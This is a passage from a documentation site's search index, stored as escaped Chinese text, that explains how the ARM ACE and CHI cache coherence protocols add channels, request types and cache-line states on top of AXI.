\u200b\u8868\u793a\u200b\u5b83\u200b\u8d1f\u8d23\u200b\u66f4\u65b0\u200b\u5185\u5b58\u200b\u3002\u200b\u4e0b\u9762\u200b\u7684\u200b\u5f88\u591a\u200b\u64cd\u4f5c\u200b\u90fd\u200b\u662f\u200b\u56f4\u7ed5\u200b\u8fd9\u4e9b\u200b\u72b6\u6001\u200b\u8fdb\u884c\u200b\u7684\u200b\u3002</p> <p>\u200b\u6587\u6863\u200b\u4e2d\u200b\u4e5f\u200b\u8bf4\u200b\uff0c\u200b\u5b83\u200b\u652f\u6301\u200b MOESI \u200b\u7684\u200b\u4e0d\u540c\u200b\u5b50\u96c6\u200b\uff1aMESI, ESI, MEI, MOESI\uff0c\u200b\u6240\u4ee5\u200b\u4e5f\u8bb8\u200b\u5728\u200b\u4e00\u4e2a\u200b\u7b80\u5316\u200b\u7684\u200b\u7cfb\u7edf\u200b\u91cc\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u72b6\u6001\u200b\u53ef\u4ee5\u200b\u4e0d\u200b\u5b58\u5728\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u4f1a\u200b\u6709\u6240\u4e0d\u540c\u200b\u3002</p> <p>\u200b\u6362\u4f4d\u200b\u601d\u8003\u200b\uff0c\u200b\u4f5c\u4e3a\u200b\u534f\u8bae\u200b\u7684\u200b\u8bbe\u8ba1\u8005\u200b\uff0c\u200b\u5e94\u8be5\u200b\u5982\u4f55\u200b\u6dfb\u52a0\u200b\u4fe1\u53f7\u200b\u6765\u200b\u5b9e\u73b0\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\uff1f\u200b\u4ece\u200b\u9700\u6c42\u200b\u51fa\u53d1\u200b\uff0c\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u9700\u8981\u200b\u5b9e\u73b0\u200b\uff1a</p> <ol> <li>\u200b\u8bfb\u200b\u6216\u200b\u5199\u200b miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u8bf7\u6c42\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u66f4\u65b0\u200b\u81ea\u5df1\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u6bd4\u5982\u200b\u8bfb\u53d6\u200b\u5230\u200b Shared\uff0c\u200b\u5199\u5165\u200b\u5230\u200b Modified \u200b\u7b49\u200b\u3002</li> <li>\u200b\u5199\u5165\u200b\u4e00\u4e2a\u200b valid &amp;&amp; !dirty \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u5347\u7ea7\u200b\u81ea\u5df1\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u6bd4\u5982\u200b\u4ece\u200b Shared \u200b\u5230\u200b Modified\u3002</li> <li>\u200b\u9700\u8981\u200b evict \u200b\u4e00\u4e2a\u200b valid &amp;&amp; dirty \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u628a\u200b dirty \u200b\u6570\u636e\u200b\u5199\u56de\u200b\uff0c\u200b\u5e76\u4e14\u200b\u964d\u7ea7\u200b\u81ea\u5df1\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u6bd4\u5982\u200b Modified -&gt; Shared/Invalid\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b evict \u200b\u4e00\u4e2a\u200b valid &amp;&amp; !dirty \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u901a\u77e5\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u4e0d\u200b\u901a\u77e5\u200b\u4e0b\u200b\u4e00\u7ea7\u200b\u3002</li> <li>\u200b\u6536\u5230\u200b snoop \u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u8fd4\u56de\u200b\u5f53\u524d\u200b\u7684\u200b\u7f13\u5b58\u6570\u636e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u66f4\u65b0\u200b\u72b6\u6001\u200b\u3002</li> <li>\u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b\u65b9\u6cd5\u200b\u6765\u200b\u901a\u77e5\u200b\u4e0b\u200b\u4e00\u7ea7\u200b Cache/Interconnect\uff0c\u200b\u544a\u8bc9\u200b\u5b83\u200b\u7b2c\u4e00\u200b\u548c\u200b\u7b2c\u4e8c\u6b65\u200b\u5b8c\u6210\u200b\u4e86\u200b\u3002</li> </ol> <p>\u200b\u9996\u5148\u200b\u8003\u8651\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u7684\u200b\u7b2c\u4e00\u4ef6\u200b\u4e8b\u60c5\u200b\uff1a\u200b\u8bfb\u200b\u6216\u200b\u5199\u200b miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u8bf7\u6c42\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u66f4\u65b0\u200b\u81ea\u5df1\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u6bd4\u5982\u200b\u8bfb\u53d6\u200b\u5230\u200b Shared\uff0c\u200b\u5199\u5165\u200b\u5230\u200b Modified \u200b\u7b49\u200b\u3002</p> <p>AXI \u200b\u5df2\u7ecf\u200b\u6709\u200b AR \u200b\u548c\u200b R channel \u200b\u7528\u4e8e\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9047\u5230\u200b\u8bfb\u200b\u6216\u8005\u200b\u5199\u200b miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b AR channel \u200b\u4e0a\u200b\u634e\u5e26\u200b\u4e00\u4e9b\u200b\u4fe1\u606f\u200b\uff0c\u200b\u8ba9\u200b\u4e0b\u200b\u4e00\u7ea7\u200b\u7684\u200b Interconnect \u200b\u77e5\u9053\u200b\u81ea\u5df1\u200b\u7684\u200b\u610f\u56fe\u200b\u662f\u200b\u8bfb\u200b\u8fd8\u662f\u200b\u5199\u200b\uff0c\u200b\u7136\u540e\u200b Interconnect \u200b\u5c31\u200b\u5728\u200b R channel \u200b\u4e0a\u200b\u8fd4\u56de\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u5177\u4f53\u200b\u8981\u200b\u634e\u5e26\u200b\u4ec0\u4e48\u200b\u4fe1\u606f\u200b\u5462\u200b\uff1f\u201c\u200b\u4e0d\u59a8\u200b\u201d\u200b\u7528\u200b\u8fd9\u6837\u200b\u4e00\u79cd\u200b\u547d\u540d\u200b\u65b9\u5f0f\u200b\uff1a<code>\u200b\u64cd\u4f5c\u200b + \u200b\u76ee\u7684\u200b\u72b6\u6001\u200b</code>\uff0c\u200b\u6bd4\u5982\u200b\u8bfb\u200b miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b Shared \u200b\u72b6\u6001\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u53eb\u200b ReadShared\uff1b\u200b\u5199\u200b miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff08\u200b\u901a\u5e38\u200b\u5199\u5165\u200b\u7f13\u5b58\u200b\u7684\u200b\u53ea\u662f\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5148\u8981\u200b\u628a\u200b\u5b8c\u6574\u200b\u7684\u200b\u8bfb\u200b\u8fdb\u6765\u200b\uff09\uff0c\u200b\u5c31\u200b\u53eb\u200b ReadUnique\u3002\u200b\u8fd9\u4e2a\u200b\u64cd\u4f5c\u200b\u53ef\u4ee5\u200b\u7f16\u7801\u200b\u5230\u200b\u4e00\u4e2a\u200b\u4fe1\u53f7\u200b\u4e2d\u200b\uff0c\u200b\u4f20\u9012\u200b\u7ed9\u200b Interconnect\u3002</p> <p>\u200b\u518d\u200b\u6765\u200b\u8003\u8651\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u7684\u200b\u7b2c\u4e8c\u4ef6\u200b\u4e8b\u60c5\u200b\uff1a\u200b\u5199\u5165\u200b\u4e00\u4e2a\u200b valid &amp;&amp; !dirty \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u5347\u7ea7\u200b\u81ea\u5df1\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u6bd4\u5982\u200b\u4ece\u200b Shared \u200b\u5230\u200b Modified\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u9700\u8981\u200b\u8ba9\u200b Interconnect \u200b\u628a\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u4e2d\u200b\u7684\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u6570\u636e\u200b\u6e05\u7a7a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u628a\u200b\u81ea\u5df1\u200b\u5347\u7ea7\u200b\u5230\u200b Unique\u3002\u200b\u6839\u636e\u200b\u4e0a\u9762\u200b\u7684\u200b <code>\u200b\u64cd\u4f5c\u200b + \u200b\u76ee\u7684\u200b\u72b6\u6001\u200b</code> \u200b\u7684\u200b\u547d\u540d\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8bb2\u200b\u5176\u200b\u547d\u540d\u200b\u4e3a\u200b CleanUnique\uff0c\u200b\u5373\u200b\u628a\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u90fd\u200b Clean \u200b\u6389\u200b\uff0c\u200b\u7136\u540e\u200b\u81ea\u5df1\u200b\u53d8\u6210\u200b Unique\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\u8003\u8651\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u7684\u200b\u7b2c\u4e09\u4ef6\u200b\u4e8b\u60c5\u200b\uff1a\u200b\u9700\u8981\u200b evict \u200b\u4e00\u4e2a\u200b valid &amp;&amp; dirty \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u628a\u200b dirty \u200b\u6570\u636e\u200b\u5199\u56de\u200b\uff0c\u200b\u5e76\u4e14\u200b\u964d\u7ea7\u200b\u81ea\u5df1\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u6bd4\u5982\u200b Modified -&gt; Shared/Invalid\u3002</p> <p>\u200b\u6309\u7167\u200b\u524d\u9762\u200b\u7684\u200b <code>\u200b\u64cd\u4f5c\u200b + \u200b\u76ee\u7684\u200b\u72b6\u6001\u200b</code> \u200b\u547d\u540d\u200b\u6cd5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u547d\u540d\u200b\u4e3a\u200b WriteBackInvalid\u3002ACE \u200b\u5b9e\u9645\u200b\u91c7\u7528\u200b\u7684\u200b\u547d\u540d\u200b\u662f\u200b WriteBack\u3002</p> <p>\u200b\u7b2c\u56db\u4ef6\u200b\u4e8b\u60c5\u200b\uff1a\u200b\u6536\u5230\u200b snoop \u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u8fd4\u56de\u200b\u5f53\u524d\u200b\u7684\u200b\u7f13\u5b58\u6570\u636e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u66f4\u65b0\u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u65e2\u7136\u200b snoop \u200b\u662f\u4ece\u200b Interconnect \u200b\u53d1\u7ed9\u200b Master\uff0c\u200b\u5728\u200b\u5df2\u6709\u200b\u7684\u200b AR R AW W B channel \u200b\u91cc\u200b\u6ca1\u200b\u529e\u6cd5\u200b\u505a\u200b\u8fd9\u4e2a\u200b\u4e8b\u60c5\u200b\uff0c\u200b\u4e0d\u7136\u200b\u4f1a\u200b\u6253\u7834\u200b\u5df2\u6709\u200b\u7684\u200b\u903b\u8f91\u200b\u3002\u200b\u90a3\u200b\u4e0d\u5f97\u4e0d\u200b\u6dfb\u52a0\u200b\u4e00\u5bf9\u200b channel\uff1a\u200b\u89c4\u5b9a\u200b\u4e00\u4e2a\u200b AC channel \u200b\u7531\u200b Interconnect \u200b\u53d1\u9001\u200b snoop \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u4e00\u4e2a\u200b C channel \u200b\u8ba9\u200b Master \u200b\u53d1\u9001\u200b\u54cd\u5e94\u200b\u3002\u200b\u8fd9\u200b\u5c31\u200b\u76f8\u5f53\u4e8e\u200b TileLink \u200b\u91cc\u9762\u200b\u7684\u200b B channel\uff08Probe \u200b\u8bf7\u6c42\u200b\uff09\u200b\u548c\u200b C channel\uff08ProbeAck \u200b\u54cd\u5e94\u200b\uff09\u3002\u200b\u5b9e\u9645\u200b ACE \u200b\u548c\u200b\u521a\u624d\u200b\u8bbe\u8ba1\u200b\u7684\u200b\u5b9e\u9645\u200b\u6709\u200b\u4e00\u4e9b\u200b\u533a\u522b\u200b\uff0c\u200b\u628a\u200b C channel \u200b\u62c6\u6210\u200b\u4e86\u200b\u4e24\u4e2a\u200b\uff1aCR \u200b\u7528\u4e8e\u200b\u8fd4\u56de\u200b\u6240\u6709\u200b\u54cd\u5e94\u200b\uff0cCD \u200b\u7528\u4e8e\u200b\u8fd4\u56de\u200b\u90a3\u4e9b\u200b\u9700\u8981\u200b\u6570\u636e\u200b\u7684\u200b\u54cd\u5e94\u200b\u3002\u200b\u8fd9\u200b\u5c31\u200b\u50cf\u200b AW \u200b\u548c\u200b W \u200b\u7684\u200b\u5173\u7cfb\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u4f20\u200b\u5730\u5740\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u4f20\u200b\u6570\u636e\u200b\uff1b\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0cCR \u200b\u4f20\u200b\u72b6\u6001\u200b\uff0cCD \u200b\u4f20\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b AC channel \u200b\u4e0a\u8981\u200b\u53d1\u9001\u200b\u4ec0\u4e48\u200b\u8bf7\u6c42\u200b\u5462\u200b\uff1f\u200b\u56de\u987e\u200b\u4e00\u4e0b\u200b\u4e0a\u9762\u200b\u5df2\u7ecf\u200b\u7528\u5230\u200b\u7684\u200b\u8bf7\u6c42\u200b\u7c7b\u578b\u200b\uff1a\u200b\u9700\u8981\u200b snoop \u200b\u7684\u200b\u6709\u200b ReadShared\uff0cReadUnique \u200b\u548c\u200b CleanUnique\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b snoop \u200b\u7684\u200b\u6709\u200b WriteBack\u3002\u200b\u90a3\u4e48\u200b\u76f4\u63a5\u200b\u901a\u8fc7\u200b AC channel \u200b\u628a\u200b ReadShared\uff0cReadUnique \u200b\u548c\u200b CleanUnique \u200b\u8fd9\u200b\u4e09\u79cd\u200b\u8bf7\u6c42\u200b\u539f\u6837\u200b\u53d1\u9001\u7ed9\u200b\u9700\u8981\u200b snoop \u200b\u7684\u200b Cache \u200b\u5373\u53ef\u200b\u3002Cache \u200b\u5728\u200b AC channel \u200b\u6536\u5230\u200b\u8fd9\u4e9b\u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u518d\u200b\u505a\u200b\u76f8\u5e94\u200b\u7684\u200b\u52a8\u4f5c\u200b\u3002</p> <p>\u200b\u7b2c\u4e94\u4ef6\u200b\u4e8b\u60c5\u200b\uff1a\u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b\u65b9\u6cd5\u200b\u6765\u200b\u901a\u77e5\u200b\u4e0b\u200b\u4e00\u7ea7\u200b Cache/Interconnect\uff0c\u200b\u544a\u8bc9\u200b\u5b83\u200b\u7b2c\u4e00\u200b\u548c\u200b\u7b2c\u4e8c\u6b65\u200b\u5b8c\u6210\u200b\u4e86\u200b\u3002TileLink \u200b\u6dfb\u52a0\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u989d\u5916\u200b\u7684\u200b E channel \u200b\u6765\u200b\u505a\u200b\u8fd9\u4e2a\u200b\u4e8b\u60c5\u200b\uff0cACE \u200b\u66f4\u52a0\u200b\u7c97\u66b4\u200b\uff1a\u200b\u76f4\u63a5\u200b\u7528\u200b\u4e00\u5bf9\u200b RACK \u200b\u548c\u200b WACK \u200b\u4fe1\u53f7\u200b\u6765\u200b\u5206\u522b\u200b\u8868\u793a\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u548c\u200b\u5199\u200b\u5df2\u7ecf\u200b\u5b8c\u6210\u200b\u3002\u200b\u5173\u4e8e\u200b WACK \u200b\u548c\u200b RACK \u200b\u7684\u200b\u8ba8\u8bba\u200b\uff0c\u200b\u8be6\u89c1\u200b What's the purpose for WACK and RACK for ACE and what's the relationship with WVALID and RVALID? \u3002</p> <p>\u200b\u8fd9\u65f6\u5019\u200b\u5df2\u7ecf\u200b\u57fa\u672c\u200b\u628a\u200b ACE \u200b\u534f\u8bae\u200b\u7684\u200b\u4fe1\u53f7\u200b\u548c\u200b\u5927\u4f53\u200b\u7684\u200b\u5de5\u4f5c\u200b\u6d41\u7a0b\u200b\u63a8\u5bfc\u200b\u51fa\u6765\u200b\u4e86\u200b\u3002\u200b\u4ece\u200b\u4fe1\u53f7\u200b\u4e0a\u200b\u6765\u770b\u200b\uff0cACE \u200b\u534f\u8bae\u200b\u5728\u200b AXI \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u4e09\u4e2a\u200b channel\uff1a</p> <ol> <li>AC: Coherent address channel, Input to master: ACADDR, ACSNOOP, ACPROT</li> <li>CR: Coherent response channel, Output from master: CRRESP</li> <li>CD: Coherent data channel, Output from master: CDDATA, CDLAST</li> </ol> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u5df2\u6709\u200b\u7684\u200b Channel \u200b\u4e5f\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u4fe1\u53f7\u200b\uff1a</p> <ol> <li>ARSNOOP[3:0]/ARBAR[1:0]/ARDOMAIN[1:0]</li> <li>AWSNOOP[3:0]/AWBAR[1:0]/AWDOMAIN[1:0]/AWUNIQUE</li> <li>RRESP[3:2]</li> <li>RACK/WACK</li> </ol> <p>ACE \u200b\u534f\u8bae\u200b\u8fd8\u200b\u8bbe\u8ba1\u200b\u4e86\u200b\u4e00\u4e2a\u200b ACE-Lite \u200b\u7248\u672c\u200b\uff1aACE-Lite \u200b\u53ea\u200b\u5728\u200b\u5df2\u6709\u200b Channel \u200b\u4e0a\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u65b0\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u6ca1\u6709\u200b\u6dfb\u52a0\u200b\u65b0\u200b\u7684\u200b Channel\u3002\u200b\u56e0\u6b64\u200b\u5b83\u200b\u5185\u90e8\u200b\u4e0d\u80fd\u200b\u6709\u200b Cache\uff0c\u200b\u4f46\u662f\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\u4e00\u81f4\u200b\u7684\u200b\u7f13\u5b58\u200b\u5185\u5bb9\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#chi","title":"CHI \u200b\u534f\u8bae","text":""},{"location":"hardware/cache_coherence_protocol.html#_5","title":"\u4ecb\u7ecd","text":"<p>CHI \u200b\u534f\u8bae\u200b\u662f\u200b AMBA 5 \u200b\u6807\u51c6\u200b\u4e2d\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\uff0c\u200b\u524d\u8eab\u200b\u662f\u200b ACE \u200b\u534f\u8bae\u200b\u3002\u200b\u6700\u65b0\u200b\u7684\u200b CHI \u200b\u6807\u51c6\u200b\u53ef\u4ee5\u200b\u4ece\u200b AMBA 5 CHI Architecture Specification \u200b\u5904\u200b\u4e0b\u8f7d\u200b\u3002</p> <p>\u200b\u76f8\u6bd4\u200b AXI\uff0cCHI \u200b\u66f4\u52a0\u200b\u590d\u6742\u200b\uff0c\u200b\u8fdb\u884c\u200b\u4e86\u200b\u5206\u5c42\u200b\uff1a\u200b\u534f\u8bae\u200b\u5c42\u200b\uff0c\u200b\u7269\u7406\u5c42\u200b\u548c\u200b\u94fe\u8def\u5c42\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0cCHI \u200b\u9002\u7528\u200b\u4e8e\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\uff0c\u200b\u652f\u6301\u200b\u6839\u636e\u200b Node ID \u200b\u8fdb\u884c\u200b\u8def\u7531\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u50cf\u200b AXI \u200b\u90a3\u6837\u200b\u53ea\u200b\u6309\u7167\u200b\u7269\u7406\u5730\u5740\u200b\u8fdb\u884c\u200b\u8def\u7531\u200b\u3002CHI \u200b\u7684\u200b\u5730\u4f4d\u200b\u5c31\u200b\u76f8\u5f53\u4e8e\u200b Intel \u200b\u7684\u200b\u73af\u5f62\u200b\u603b\u7ebf\u200b\u3002CHI \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6865\u200b\u63a5\u5230\u200b CCIX \u200b\u4e0a\u200b\uff0c\u200b\u7528\u200b CCIX \u200b\u8fde\u63a5\u200b SMP \u200b\u7684\u200b\u7684\u200b\u591a\u4e2a\u200b Socket\uff0c\u200b\u6216\u8005\u200b\u8fde\u63a5\u200b\u652f\u6301\u200b CCIX \u200b\u7684\u200b\u663e\u5361\u200b\u7b49\u7b49\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#_6","title":"\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001","text":"<p>\u200b\u9996\u5148\u200b\u56de\u987e\u200b ACE \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\uff0c\u200b\u5171\u6709\u200b\u4e94\u79cd\u200b\uff0c\u200b\u4e0e\u200b MOESI \u200b\u76f8\u5bf9\u200b\u5e94\u200b\uff1a</p> <ol> <li>UniqueDirty: Modified</li> <li>SharedDirty: Owned</li> <li>UniqueClean: Exclusive</li> <li>SharedClean: Shared</li> <li>Invalid: Invalid</li> </ol> <p>\u200b\u5728\u200b\u6b64\u57fa\u7840\u200b\u4e0a\u200b\uff0cCHI \u200b\u8003\u8651\u200b\u7f13\u5b58\u200b\u884c\u200b\u53ea\u6709\u200b\u90e8\u5206\u200b\u5b57\u8282\u200b\u6709\u6548\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u5373\u200b Full\uff0cPartial \u200b\u6216\u8005\u200b Empty\u3002\u200b\u56e0\u6b64\u200b CHI \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\u5171\u6709\u200b\u4e03\u79cd\u200b\uff1a</p> <ol> <li>UniqueDirty: Modified</li> <li>UniqueDirtyPartial: \u200b\u65b0\u589e\u200b\uff0c\u200b\u53ef\u80fd\u200b\u6709\u200b\u90e8\u5206\u200b\u5b57\u8282\u200b\u5408\u6cd5\u200b\uff0c\u200b\u5728\u200b\u5199\u200b\u56de\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u548c\u200b\u4e0b\u200b\u4e00\u7ea7\u200b\u7f13\u5b58\u200b\u6216\u8005\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u5408\u6cd5\u200b\u7f13\u5b58\u200b\u884c\u200b\u5185\u5bb9\u200b\u8fdb\u884c\u200b\u5408\u5e76\u200b</li> <li>SharedDirty: Owned</li> <li>UniqueClean: Exclusive</li> <li>UniqueCleanEmpty: \u200b\u65b0\u589e\u200b\uff0c\u200b\u6240\u6709\u200b\u5b57\u8282\u200b\u90fd\u200b\u4e0d\u200b\u5408\u6cd5\u200b\uff0c\u200b\u4f46\u662f\u200b\u672c\u200b\u7f13\u5b58\u200b\u5360\u6709\u200b\u8be5\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u4fee\u6539\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u901a\u77e5\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b</li> <li>SharedClean: Shared</li> <li>Invalid: Invalid</li> </ol> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u6bd4\u8f83\u200b\u7279\u522b\u200b\u7684\u200b\u5c31\u662f\u200b UniqueDirtyPartial \u200b\u548c\u200b UniqueCleanEmpty\u3002CHI \u200b\u6807\u51c6\u200b\u5728\u200b 4.1.1 \u200b\u7ae0\u8282\u200b\u7ed9\u51fa\u200b\u4e86\u200b\u4f7f\u7528\u200b\u573a\u666f\u200b\uff1a\u200b\u5982\u679c\u200b\u4e00\u4e2a\u200b CPU \u200b\u5373\u5c06\u200b\u8981\u200b\u5199\u5165\u200b\u4e00\u7247\u200b\u5185\u5b58\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u5148\u200b\u8f6c\u6362\u200b\u5230\u200b UniqueCleanEmpty \u200b\u72b6\u6001\u200b\u4e2d\u200b\uff0c\u200b\u628a\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u4e2d\u200b\u7684\u200b\u6570\u636e\u200b\u90fd\u200b\u6e05\u7a7a\u200b\uff0c\u200b\u8fd9\u6837\u200b\u540e\u7eed\u200b\u5199\u5165\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u8be2\u95ee\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\uff0c\u200b\u6027\u80fd\u200b\u6bd4\u8f83\u200b\u597d\u200b\u3002\u200b\u4f46\u200b\u6b64\u65f6\u200b\u56e0\u4e3a\u200b\u6570\u636e\u200b\u8fd8\u200b\u6ca1\u200b\u5199\u8fdb\u53bb\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5c31\u662f\u200b Empty\uff0c\u200b\u53ea\u200b\u66f4\u65b0\u200b\u72b6\u6001\u200b\uff0c\u200b\u4e0d\u200b\u5360\u7528\u200b\u7f13\u5b58\u200b\u7684\u200b\u7a7a\u95f4\u200b\u3002\u200b\u53e6\u4e00\u65b9\u9762\u200b\uff0c\u200b\u5982\u679c\u200b CPU \u200b\u53ea\u200b\u5199\u200b\u4e86\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\u5b57\u8282\u200b\uff0c\u200b\u5176\u4ed6\u200b\u90e8\u5206\u200b\u6ca1\u6709\u200b\u78b0\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5f15\u5165\u200b UniqueDirtyPartial \u200b\u4ee5\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u628a\u200b\u5408\u5e76\u200b\u65b0\u65e7\u200b\u7f13\u5b58\u200b\u884c\u200b\u6570\u636e\u200b\u8fd9\u200b\u4e00\u6b65\u200b\uff0c\u200b\u4e0b\u200b\u653e\u5230\u200b\u6bd4\u8f83\u200b\u9760\u8fd1\u200b\u5185\u5b58\u200b\u7684\u200b\u5c42\u7ea7\u200b\u4e0a\u200b\uff0c\u200b\u51cf\u5c11\u200b\u4e86\u200b\u6570\u636e\u200b\u642c\u8fd0\u200b\u7684\u200b\u6b21\u6570\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#chi_1","title":"CHI \u200b\u7f51\u7edc\u200b\u8282\u70b9","text":"<p>CHI \u200b\u7684\u200b\u8282\u70b9\u200b\u7ec4\u7ec7\u200b\u6210\u200b\u4e00\u4e2a\u200b\u7f51\u7edc\u200b\uff0c\u200b\u53ef\u80fd\u200b\u662f\u200b\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u662f\u200b\u7247\u95f4\u200b\u7684\u200b\u8fde\u63a5\u200b\u3002CHI \u200b\u7684\u200b\u8282\u70b9\u200b\u5206\u6210\u200b\u4e09\u79cd\u200b\u7c7b\u578b\u200b\uff1a</p> <ol> <li>Request Node\uff1a\u200b\u53d1\u8d77\u200b CHI \u200b\u8bf7\u6c42\u200b\u7684\u200b\u8282\u70b9\u200b\uff0c\u200b\u5bf9\u5e94\u200b CPU \u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u6216\u8005\u200b\u662f\u200b\u7f51\u5361\u200b\u7b49\u200b\u5916\u8bbe\u200b</li> <li>Home Node\uff1a\u200b\u7ba1\u7406\u200b Request Node \u200b\u6765\u200b\u7684\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u6700\u540e\u200b\u4e00\u7ea7\u200b\u7f13\u5b58\u200b</li> <li>Subordinate 